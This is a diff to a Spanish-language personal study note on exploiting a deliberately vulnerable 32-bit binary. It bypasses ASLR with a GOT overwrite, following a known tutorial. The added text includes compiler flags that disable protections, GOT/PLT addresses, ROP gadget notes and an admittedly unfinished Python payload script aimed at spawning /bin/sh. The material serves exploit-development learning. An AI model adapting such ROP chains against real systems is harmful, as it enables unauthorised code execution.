@@ -515,7 +515,7 @@ EJEMPLO 2
 
 https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-iii/
 
-No intentar compilar el ejecutable con las nuevas versiones de Debian o Ubuntu porque viene por defecto el gcc con PIE y no vais a conseguir que funcione por la protección. Tampoco sirve deshabilitar el pie especificamente o todo:
+No intentar compilar el ejecutable con las nuevas versiones de Debian o Ubuntu porque viene por defecto el gcc con PIE y no vais a conseguir que funcione por la protección. Tampoco sirve deshabilitar el PIE especificamente o todo:
 
 ```
 gcc -fno-stack-protector -z execstack  -fno-pie -o vuln vuln.c
@@ -540,7 +540,7 @@ int main (int argc, char **argv) {
  return 0;
 }
 ```
-Al final lo que hice fue compilarlo en una máquina con una versión antigua de Debian y compilarlo, de esta forma tenemos el binario como queremos para explotarlo:
+Al final lo que hice fue compilarlo en una máquina con una versión antigua de Debian, de esta forma tenemos el binario como queremos para explotarlo:
 
 ```
 gdb-peda$ checksec 
@@ -553,6 +553,8 @@ RELRO     : Partial
 
 Vamos a averiguar lo que necesitamos para hacer un GOT overwritten:
 
+La diferencia entre system y otra función que se llame en el programa, en este caso getuid.
+
 Offset: 0xfff88ea0
 
 ```
@@ -561,7 +563,7 @@ $10 = 0xfff88ea0
 ```
 
 GOT getuid: 0x804a010
-
+PLT getuid: 0x80483c0
 ```
 objdump -M intell -drw ./vuln | grep -a3 getuid
 080483c0 <getuid@plt>:
@@ -570,19 +572,61 @@ objdump -M intell -drw ./vuln | grep -a3 getuid
  80483cb:	e9 d0 ff ff ff       	jmp    80483a0 <.plt>
 ```
 
-El problema es que a la hora de buscar 
+El problema es que a la hora de buscar gadgets no hay ninguno que nos sume el valor del offset a la posición del GOT de getuid. Algo como: "add [ebx+0x5d5b04c4] eax". Lo único parecido que he encontrado es "adc [esi+0x140e4104] al", pero no se como hacer que el flag CF=1.
+No sé como solucionarlo entonces. Seguiré buscando...
+Este es el script de python que estaba haciendo:
+
+```python
+#!/usr/bin/python
+
+
+from struct import pack
+
+
+# Peta en 268
+# 222 +
+junk = "A" * 268
+
+gadget1 = 0x0804861c	        #: pop ebx ; pop esi ; pop edi ; pop ebp ;;
+gadget2 = 0x8048712		       	#: add eax [ebx+0xe] ; adc [esi+0x140e4104] al ; add dword [0x2300e4e] 0x48 ; push cs ; adc al 0x41 ;;
+
+padding = 0xdeadbeef
+memreal = 0x0804a030
+#offset = 0xfff88ea0
+offset = 0x77160
+getuid_got = (0x804a010-0x140e4104) & 0xFFFFFFFF
+getuid_plt = 0x080483c0
+gnu_bash = 0xb7f54d28
+#0x80002018
+#libc : 0xb7f54d28 ("/bin/sh")
+
+
+#rop = "BBBB"
+rop = pack('<I',gadget1)
+rop += pack('<I', memreal)
+rop += pack('<I', getuid_got)
+rop += pack('<I', padding)
+rop += pack('<I', padding)
+
+
+rop += pack('<I',gadget2)
+rop += pack('<I', offset)
+rop += pack('<I', padding)
+rop += pack('<I', padding)
+rop += pack('<I', padding)
+rop += pack('<I', gnu_bash)
+
+
+junk2 = "C" * 44
+payload = junk + rop 
+# + rop
+
+print payload
+```
 
 
 
-
-
-
-
-
-
-
-
-
+---------------------------------------------------------------------------------------------------
 El caso de cheer_msg (otro día porque creo que no es un ataque a GOT, tengo que estudiarlo más)
 
 
